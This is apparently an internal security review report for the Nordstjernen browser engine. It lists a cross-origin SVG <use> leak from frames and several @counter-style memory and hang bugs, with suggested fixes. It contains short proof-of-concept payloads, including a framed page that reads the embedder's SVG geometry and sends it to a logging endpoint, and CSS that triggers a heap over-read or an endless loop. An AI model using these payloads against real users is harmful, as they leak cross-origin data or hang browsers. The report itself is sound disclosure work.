# Security review report, 2026-11-28

Source review of Nordstjernen at `d01d6c88` (`origin/main` `ebe7cda6` plus
the minimp3 sync), looking for security vulnerabilities in the first-party
source. One reviewer, one pass. It replaces the two earlier reports
(2026-11-21 and the first pass of 2026-11-28), which were deleted from the
tree; their findings that are still open are carried in §4 and §6.

The review changed no source file and nothing is fixed.

## 1. Summary

- **One new medium finding (B1): a cross-origin frame can read from the
  embedder's SVG files.** An external `<use href>` inside a framed document
  is checked against the top document's origin, not the frame's. The frame
  makes the browser fetch a same-origin-to-the-embedder SVG and then reads
  the size of any element in it, including the rendered width of its text.
  Reproduced.
- **Three findings from the first pass today are still in the tree**
  (A2 to A4, all in `@counter-style`): a heap over-read, an endless loop and
  a process-wide registry. A1 from that pass is fixed (`178e3d40`).
- No memory-safety bug was found in the code read this time (§5).
- **Most of the tree is still unread.** This pass read about 7,000 lines
  closely out of roughly 300,000.

| # | Finding | Attacker | Severity | Evidence |
|---|---------|----------|----------|----------|
| B1 | External SVG `<use>` in a frame is authorised against the top document | any framed cross-origin document | medium | run: frame read 123x77 and text widths from the embedder's SVG; control made no request |
| A2 | `@counter-style`: `symbols` after `additive-symbols` leaves weights shorter than symbols; out-of-bounds read | any web page | medium | run in the first pass; code unchanged |
| A3 | `@counter-style`: an `extends` cycle loops forever under the registry lock | any web page | low (hang) | run in the first pass; code unchanged |
| A4 | Counter styles are process-wide: a cross-origin frame overrides the embedder's, and they outlive navigation | any framed document | low | run in the first pass; code unchanged |

"Run" for B1 means confirmed on `builddir/src/gtk/nordstjernen.exe` built
from this tree on 2026-11-28 (Windows, MSYS2 UCRT64), headless, private
mode, against two local HTTP servers on different ports. A2 to A4 were run
by the first pass on `712d32c4`; this pass only re-read the code and found
it unchanged.

## 2. Method and coverage

| Area | Read closely | Not reached |
|------|--------------|-------------|
| Image decoders | all of `image_webp.c`, `image_jxl.c`, `image_avif.c` | `font.c` |
| Shell | all of `rjson.c`, `json_string.c`, `sessionstore.c`; token and port-file handling in `remotectl.c` (730-760, 855-930) | `webdriver.c`, `mcp.c`, rest of `remotectl.c`, `procview.c`, `procwindow.c` |
| Canvas | `js_canvas.c`: ImageData get / put / create (2687-2880), ImageBitmap from ImageData and Blob (189-320), shadow blur (1195-1300), image-source and taint resolution (2402-2515), export checks; `ns_js_resource_origin_clean` | Rest of `js_canvas.c`, `js_canvas_api.c` |
| Script buffer access | `ns_js_bytes_view` and every raw-buffer site in `js.c` at 11537, 13005, 13104, 13701, 14763, 15930, 17609, 21905, 25820-25885, 26070, 26425-26475, 27810, 29119, 31549, 64310 | The WebGL, WebGPU, wasm and Web Audio sites (read by earlier reviews); the rest of `js.c` |
| SVG | all of `svg_external.c`; `svg.c` href resolution, `svg_prop`, transform and arc parsing (490-520, 890-1060) | Rest of `svg.c` |
| SMIL | `smil.c` number, key-time, key-spline and motion-path indexing (155-560, 625-650) | Timing model, event wiring |
| CSS | Fixed unit buffers in `css_anchor.c`, `css_shape.c`, `css_media.c`, `css_color.c`; math-sum term limits (`css.c` 4450-4700); the stylesheet charset change `fb8b2f2a` (`engine.c`, `html.c`); `css_counter_style.c` re-read for A2 to A4 | Cascade, selectors, `var()` / `calc()` evaluation, Typed OM (`data/js/typed-om.js`) |
| Cache | `cache.c` keys, body paths, date parsing, lookup (100-275, 474-530, 677-770) | Store and eviction paths |
| Policy | Service-worker registration (`js.c` 33212-33300), worker MIME check, clipboard read, file-input `files` | Cookies, CSP, fetch / CORS, navigation, drag and drop (`8e2238f0`), shared wasm memories (`3844179a`, `4c02f919`) |
| Not touched at all | | `layout.c`, `paint.c`, `net.c`, `dom.c`, `forms.c`, `anim.c`, `video*.c`, `media_os*.c`, `audio/main.c`, `wasm.c`, `idb.c`, `ext.c`, `xml.c`, `src/quickjs-bellard/`, `src/web-text-lib/`, the Rust parsers, the sandbox |

No sanitizer build was made and no fuzzer was run.

## 3. New finding

### B1. External SVG `<use>` in a frame is authorised against the top document (medium)

**Where.**
- `ns_svg_external_note_base` is called only for the top document, from
  `ns_engine_restyle` and `ns_engine_relayout` (`src/engine.c:1985`,
  `:2026`).
- `svg_external_base_for`, `src/svg_external.c:70-81`, walks from the
  referring element up through `parent`. A framed document is a document
  node with a parent, has no entry of its own, and so the walk continues
  into the embedder and returns the top document's entry.
- `ns_svg_external_target`, `src/svg_external.c:122-137`, then resolves the
  `href` against the top document's base URL, requires the result to be
  same-origin with the **top document's** URL, and fetches it with the top
  document as the requesting document.

**Why it is wrong.** The same-origin rule for external `<use>` is meant to
compare the SVG file with the document that contains the `<use>`. For a
framed document the comparison is made with its embedder. A frame may
therefore reference SVG files of the embedder's origin, which it must not
read, and may not reference files of its own origin, which it should.

**Attack.** The attacker's page only has to be framed by the victim site
(an advertisement, a widget, an embedded preview):

```html
<!-- http://attacker/frame.html, framed by http://victim/ -->
<svg><use id="u" href="http://victim/account/badge.svg#name"/></svg>
<script>
setTimeout(() => {
  const b = document.getElementById('u').getBBox();
  fetch('/log?' + b.width + 'x' + b.height);
}, 3000);
</script>
```

**Evidence.** Embedder at `127.0.0.1:8801`, frame at `127.0.0.1:8802`.
- The embedder's server logged `GET /secret.svg` caused by the frame.
- The frame's script reported `bbox=123x77` for a `<rect width=123
  height=77>` in that file.
- Pointed at a `<text>` element it reported `76x19` for `SECRET-A` and
  `241x19` after the text was changed to `SECRET-A-LONGER-TEXT-HERE`.
- Control: the same frame page loaded as a top-level document made no
  request to the embedder's server.

**Impact.** A cross-origin read limited to geometry: whether an `id`
exists in a same-origin-to-the-embedder SVG file, the bounding box of any
element in it, and the rendered width of its text. The referenced content
is also painted inside the attacker's frame. Whether the fetch carries the
embedder's cookies was not checked; the request is issued for the
embedder's document, so it probably does. Pixels are not readable, since
inline SVG is not a canvas image source.

**Fix.** Register a base for each framed document (its own URL and base
URL), and stop the walk in `svg_external_base_for` at the first document
node instead of continuing into the embedder when that node has no entry.
Northstar and Southstar share this file: suggested slug
`svg-external-use-frame-origin`.

## 4. Findings carried from the first pass today (still open)

The first pass's report is deleted, so the essentials are repeated here.
All three are in `src/css_counter_style.c`, which has not changed.

### A2. `@counter-style`: weights shorter than symbols (medium)

`descriptor_symbols` (`:147-158`) replaces `cs->symbols` and leaves
`cs->weights` alone. `counter_style_valid` (`:332-333`) accepts an additive
style when weights exist and there is at least one symbol. `counter_digits`
(`:651-669`) indexes `weights` with `n = symbols->len`.

`additive-symbols: 1 "a"` followed by a `symbols` descriptor with up to 256
entries gives one weight and up to 256 symbols, so the additive branch
reads up to 255 `gint64` values past a small `GArray`. Each value decides
whether a symbol is written into the counter text, which the page can
measure. The first pass saw the output of one page vary between runs with
heap contents.

```html
<style>
@counter-style w{system:additive;additive-symbols:1 "a";symbols:"A" "B" ... 200 strings ...;}
.w::before { content: counter(c, w) " "; }
</style>
<div class=w style="counter-reset: c 0">|</div>
```

**Fix.** Let `descriptor_symbols` drop `cs->weights`, or require
`weights->len == symbols->len` in `counter_style_valid`; bound the loop in
`counter_digits` by `weights->len` as a backstop.

### A3. `@counter-style`: an `extends` cycle never terminates (low)

`counter_value_in_range` (`:577-587`) follows `extends` until it finds a
range, reaches the algorithm style or returns to its starting style. For a
cycle that does not include the starting style none of these happens, and
the loop runs with `g_counter_styles_lock` held. The other chain walkers in
the file are bounded by `NS_COUNTER_STYLE_MAX_CHAIN`.

```html
<style>
@counter-style a{system:extends b;}
@counter-style b{system:extends c;}
@counter-style c{system:extends b;}
.f::before { content: counter(c, a); }
</style>
<div class=f style="counter-reset: c 7">|</div>
```

**Fix.** Bound the loop with `NS_COUNTER_STYLE_MAX_CHAIN`.

### A4. Counter styles are shared by every document in the renderer (low)

`g_counter_styles` (`:47-48`) is one table per process, keyed by name, and
nothing removes entries. `counter_format` (`src/layout.c`) asks it before
the built-in styles. A cross-origin frame can redefine a counter style its
embedder uses (the first pass showed a `data:` frame changing the
embedder's counter text), and one site's definitions stay active for the
next site in the tab. Content spoofing of counter and list-marker text
only.

**Fix.** Keep the registry per document and drop it on navigation.

Both A2 and A3 need the rule written without white space after `{` and
`;`, because `counter_style_parse_body` skips a declaration whose first
component is white space. That is a rendering bug of its own.

## 5. Observations not established as findings

- **`svg_external.c` keys its base table by raw document pointer and never
  removes an entry.** `g_bases` (`:39`, `:52-68`) maps `ns_node *` to a base
  URL and document URL. After a document is freed its entry stays. A later
  root node allocated at the same address, such as the parsed document of
  an SVG image (`ns_svg_parse_bytes`), which is never registered, would
  inherit the dead document's origin for the check in B1. Not run; it
  needs address reuse.
- **The external-SVG document cache is process-wide and capped at 64
  entries for the life of the renderer** (`g_docs`, `:40`, `:106-121`).
  Nothing evicts. A page that references 64 files disables external
  `<use>` for every later page in the tab, and a fetched file is reused
  across navigations whatever cookies it was fetched with.
- **Canvas taint: `crossorigin` is read at draw time.**
  `ns_ctx_drawimage_source` (`src/js_canvas.c:2428`, `:2472`) treats an
  image as CORS-approved when the element has a `crossorigin` attribute
  *now* and the stored response carried a matching
  `Access-Control-Allow-Origin`. If the stored header comes from a load
  made without the attribute (a credentialed no-cors request), a page could
  add the attribute afterwards and read pixels of a response that was
  fetched with cookies and answered with `Access-Control-Allow-Origin: *`.
  Not traced to the image loader and not run.
- **User activation is one timestamp per tab** (`src/js.c:208-227`). A
  click in any frame activates every frame, including cross-origin ones
  that are not its ancestors.
- **`svg_prop` returns a per-thread static buffer** (`src/svg.c:506-515`)
  for values that contain `var()`. A caller that holds one result while
  asking for another sees the second value. No memory-safety consequence;
  possible wrong rendering.
- **From the first pass, not re-checked:** the renderer can read all of
  `$XDG_RUNTIME_DIR` (`src/security.c:660`); the audio decoding process
  keeps `shmat` with `SHM_EXEC`; the audio helper still contains an
  unreachable HTTP fetch (`src/audio/main.c:1201-1248`); the download
  "program file" prompt uses an extension deny-list and names the host of
  the requested URL, not of the redirect target.

## 6. Open items from the 2026-11-21 report

That report is deleted from the tree (it remains in git history at
`docs/security-review-report-2026-11-21.md`). None of these was re-checked
in this pass.

| Item | Description |
|------|-------------|
| M3 | WebGL2 index validation uses a stale shadow of the element buffer |
| M4 | WebGL buffer sizes tracked by GL name; deleted buffer still attached to a vertex array |
| J15 | Style value pointer used after a layout flush that can free it |
| N3 / J7 | Sub-frame rewrites the tab URL; history state is tab-wide |
| N4 | WebGPU canvas context holds a raw canvas node pointer |
| N5 | Compression dictionaries not partitioned by top-level site |
| N7 | Audio-helper verbs other than `open` / `reload` unchecked |
| N8 | Unchecked `snprintf` chaining in `render_request_json` |
| J6, J8, J9 | Script-animation events, `pointerLockElement` and selection text are tab-wide |
| J10 | Internal natives callable by page script |
| J12, J13, J14, J16 | `document.referrer` on synthetic documents; camera labels without permission; fetch response headers filtered against the wrong document; `pending_scrollend` raw node pointers |
| F3, F4, F5 | `import()` of `data:` / `blob:` skips CSP `script-src`; CSP `'self'` matches `blob:`; top-level navigation to `data:` |
| F6, F7 | Transfer detaches a `WebAssembly.Memory` buffer; undefined float-to-int conversions |
| S1 / G6, S3 / G7, S11 | Shell trusts the renderer-reported URL; config rewrite starts remote control; private mode falls back to a guessable `/tmp` directory |

## 7. Checked and found sound

- **WebP, JPEG XL, AVIF wrappers.** Input size, dimensions, pixel count,
  frame count and total animation bytes are capped before allocation; the
  JPEG XL output buffer size is compared with the decoder's own figure;
  the AVIF row stride is checked before the copy.
- **Shell JSON (`rjson.c`, `json_string.c`).** Depth capped at 64; string
  buffers are sized from the source span, which the decoded form cannot
  exceed; surrogates and `\u0000` handled.
- **Session store.** All statements are prepared with bound parameters.
- **Remote control.** 256-bit token from `RAND_bytes`, compared in constant
  time, port file written `0600` in a `0700` directory, bad token closes
  the connection.
- **Canvas pixel paths.** `getImageData`, `putImageData` and
  `createImageBitmap` convert every argument before they fetch the surface
  and buffer pointers, clamp the dirty rectangle to the source, and check
  the buffer length against `width * height * 4` with both factors capped
  at 32767. Tainted canvases are refused by `getImageData`, `toDataURL`,
  `toBlob`, `convertToBlob`, and as WebGL and WebGPU sources.
- **Raw buffer access from script.** At the sites listed in §2 the pointer
  is fetched after the last call that can run script, and offset plus
  length is checked against the buffer. The two copies between resizable
  buffers re-fetch both pointers after constructing the target.
- **HTTP cache.** Keys are SHA-256 of URL, partition and `Vary` selector;
  body paths are built from the digest only; `Vary` on a header outside a
  short allow-list makes the response uncacheable.
- **Stylesheet charset decoding (`fb8b2f2a`).** Encoding names stored on
  sheets and in the cache point into static tables; `@charset` sniffing is
  bounded to 1024 bytes.
- **Fixed unit buffers** in the CSS helpers are filled under a length
  check or `g_strlcpy`; `calc()` sums are capped at 16 unit terms.
- **SMIL.** Key-time, key-point and key-spline indices are bounded by the
  array lengths; clock parsing copies at most 63 bytes.
- **Service workers.** Opaque origins are refused; script and scope must be
  same-origin and the scope under the script's directory; the script must
  have a JavaScript MIME type; `worker-src` is applied.
- **Clipboard.** `readText` and `read` always reject.

## 8. Suggested order of work

1. **B1.** Scope the external-`<use>` base to the containing document, and
   remove table entries when a document is freed.
2. **A2 and A3.** Two small checks in `css_counter_style.c`.
3. **A4.** Scope the counter-style registry to the document.
4. Trace the canvas `crossorigin` observation into the image loader.
5. Read what is still unread. The largest never-read areas are the CSS
   cascade and `var()` / `calc()` evaluation, `layout.c`, `paint.c`,
   `net.c` outside the ranges earlier reviews covered, `forms.c`, `dom.c`,
   the drag-and-drop and shared-wasm-memory changes, and Typed OM. An
   AddressSanitizer build on Linux run over `data/render-tests/` and the
   WPT CSS areas is still the cheapest way to find more bugs of the A1 and
   A2 kind.
